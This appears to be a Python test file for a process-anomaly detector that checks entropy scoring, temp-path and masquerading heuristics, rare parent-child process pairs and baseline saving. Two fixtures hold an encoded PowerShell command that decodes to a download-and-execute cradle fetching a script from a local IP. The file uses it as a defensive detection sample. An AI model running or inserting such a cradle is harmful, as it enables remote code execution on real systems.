"""Tests for process-anomaly-detector.py — covers frequency baselining, entropy, LOLBIN heuristics."""

import importlib.util
import json
import math
import sys
import tempfile
from datetime import datetime, timezone
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

def _load_detector_module():
    root = Path(__file__).resolve().parent.parent
    for candidate in ("process-anomaly-detector.py", "process_anomaly_detector.py"):
        p = root / candidate
        if p.exists():
            spec = importlib.util.spec_from_file_location("process_anomaly_detector", p)
            if spec and spec.loader:
                mod = importlib.util.module_from_spec(spec)
                sys.modules["process_anomaly_detector"] = mod
                spec.loader.exec_module(mod)
                return mod
    raise ImportError("Could not find process-anomaly-detector.py")

_mod = _load_detector_module()
shannon_entropy = _mod.shannon_entropy
is_temp_or_writable_path = _mod.is_temp_or_writable_path
is_masquerading = _mod.is_masquerading
detect_anomalies = _mod.detect_anomalies
ProcessEvent = _mod.ProcessEvent
ProcessBaseline = _mod.ProcessBaseline


# ── Test 1: Shannon Entropy Calculation ───────────────────────────

def test_shannon_entropy():
    # Low entropy standard text
    low_ent = shannon_entropy("cmd.exe /c dir C:\\Users")
    assert low_ent < 4.0

    # High entropy base64 encoded payload
    high_ent = shannon_entropy("powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgAxADAALwBzAGgAZQBsAGwALgBwAHMAMQAnACkA")
    assert high_ent >= 4.3


# ── Test 2: Temp / Writable Path Detection ────────────────────────

def test_writable_paths():
    assert is_temp_or_writable_path("C:\\Users\\victim\\AppData\\Local\\Temp\\payload.exe") is True
    assert is_temp_or_writable_path("C:\\Windows\\Temp\\malware.exe") is True
    assert is_temp_or_writable_path("/tmp/evil_elf") is True
    assert is_temp_or_writable_path("C:\\ProgramData\\updater.exe") is True
    assert is_temp_or_writable_path("C:\\Windows\\System32\\svchost.exe") is False
    assert is_temp_or_writable_path("C:\\Program Files\\App\\app.exe") is False


# ── Test 3: System Binary Masquerading ────────────────────────────

def test_system_binary_masquerading():
    # svchost running outside System32
    assert is_masquerading("C:\\Users\\victim\\AppData\\svchost.exe") is True
    # svchost running from legitimate System32
    assert is_masquerading("C:\\Windows\\System32\\svchost.exe") is False
    # Legitimate non-system binary
    assert is_masquerading("C:\\Tools\\custom.exe") is False


# ── Test 4: Rare Parent-Child Anomaly Detection ───────────────────

def test_rare_parent_child_anomaly():
    events = []
    base_ts = datetime(2026, 11, 18, 10, 0, 0, tzinfo=timezone.utc)

    # 50 normal events: explorer.exe -> chrome.exe
    for i in range(50):
        events.append(ProcessEvent(
            timestamp=base_ts,
            host="WS01",
            user="CORP\\alice",
            parent_path="C:\\Windows\\explorer.exe",
            image_path="C:\\Program Files\\Google\\Chrome\\chrome.exe",
            command_line="chrome.exe --new-window",
        ))

    # 1 anomalous outlier: WINWORD.EXE -> powershell.exe with high entropy encoded command
    events.append(ProcessEvent(
        timestamp=base_ts,
        host="WS01",
        user="CORP\\alice",
        parent_path="C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
        image_path="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        command_line="powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgAxADAALwBzAGgAZQBsAGwALgBwAHMAMQAnACkA",
    ))

    anomalies = detect_anomalies(events, min_baseline_frequency=5)
    assert len(anomalies) >= 1
    top_hit = anomalies[0]
    assert "powershell.exe" in top_hit.image_path.lower()
    assert top_hit.anomaly_score >= 75
    assert any("rare" in r.lower() or "parent" in r.lower() for r in top_hit.reasons)
    assert any("entropy" in r.lower() or "encoded" in r.lower() for r in top_hit.reasons)


# ── Test 5: Baseline Persistence (Save & Load) ────────────────────

def test_baseline_save_and_load(tmp_path: Path):
    bl_file = tmp_path / "baseline.json"
    bl = ProcessBaseline(min_frequency=3)

    # Train baseline with frequent events
    for _ in range(10):
        bl.observe("explorer.exe", "notepad.exe", "corp\\user")

    assert bl.is_known("explorer.exe", "notepad.exe", "corp\\user") is True
    assert bl.is_known("services.exe", "cmd.exe", "corp\\user") is False

    # Save to disk
    bl.save(bl_file)
    assert bl_file.exists()

    # Load in new instance
    bl_loaded = ProcessBaseline.load(bl_file)
    assert bl_loaded.is_known("explorer.exe", "notepad.exe", "corp\\user") is True
    assert bl_loaded.is_known("services.exe", "cmd.exe", "corp\\user") is False


# ── Test Runner ───────────────────────────────────────────────────

if __name__ == "__main__":
    passed = 0
    failed = 0

    tests = [
        test_shannon_entropy,
        test_writable_paths,
        test_system_binary_masquerading,
        test_rare_parent_child_anomaly,
    ]

    for test in tests:
        try:
            test()
            print(f"  ✓ {test.__name__}")
            passed += 1
        except AssertionError as e:
            print(f"  ✗ {test.__name__}: {e}")
            failed += 1

    try:
        with tempfile.TemporaryDirectory() as td:
            test_baseline_save_and_load(Path(td))
        print("  ✓ test_baseline_save_and_load")
        passed += 1
    except AssertionError as e:
        print(f"  ✗ test_baseline_save_and_load: {e}")
        failed += 1

    print(f"\n  {passed} passed, {failed} failed")
    sys.exit(1 if failed else 0)
